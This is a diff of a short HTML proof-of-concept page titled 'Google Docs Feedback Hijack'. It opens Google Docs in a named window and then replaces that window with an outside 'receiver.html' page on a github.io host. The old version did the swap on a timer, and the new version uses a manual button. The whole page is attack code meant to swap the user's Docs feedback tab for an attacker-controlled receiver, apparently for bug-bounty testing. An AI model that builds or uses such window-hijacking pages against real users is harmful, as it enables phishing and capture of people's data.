@@ -1,31 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Google Docs Feedback Hijack – Named Window</title>
+  <title>Google Docs Feedback Hijack – Manual Trigger</title>
 </head>
 <body>
-  <h2>🧪 Google Docs Feedback Hijack – Named Window Variant</h2>
-  <p>This attack swaps the Docs feedback iframe mid-session using native JS only (no bookmarklet, no DevTools).</p>
+  <h2>Docs Feedback Hijack (Manual Timing)</h2>
 
-  <ol>
-    <li>Click the button to open Docs in a new tab</li>
-    <li>In that tab, trigger <strong>Help → Send Feedback</strong></li>
-    <li>This page will wait and then hijack the iframe by replacing the tab</li>
-  </ol>
+  <p>This variant allows you to open Docs in a named window and manually trigger the swap at the right time.</p>
 
-  <button onclick="launch()">Launch Docs</button>
+  <button onclick="openDocs()">Open Docs</button>
+  <button onclick="swap()">Swap Feedback Iframe</button>
 
   <script>
-    function launch() {
-      // Open Google Docs in a named tab
+    function openDocs() {
       window.open("https://docs.google.com/document/u/0/create", "feedbackwin");
+    }
 
-      // Wait 15 seconds to let user trigger feedback UI
-      setTimeout(() => {
-        // Hijack that named window
-        window.open("https://musgaas.github.io/receiver-test/receiver.html", "feedbackwin");
-        console.log("✅ Iframe/tab replaced with receiver.html");
-      }, 25000);
+    function swap() {
+      window.open("https://musgaas.github.io/receiver-test/receiver.html", "feedbackwin");
+      console.log("✅ Swapped feedback iframe");
     }
   </script>
 </body>
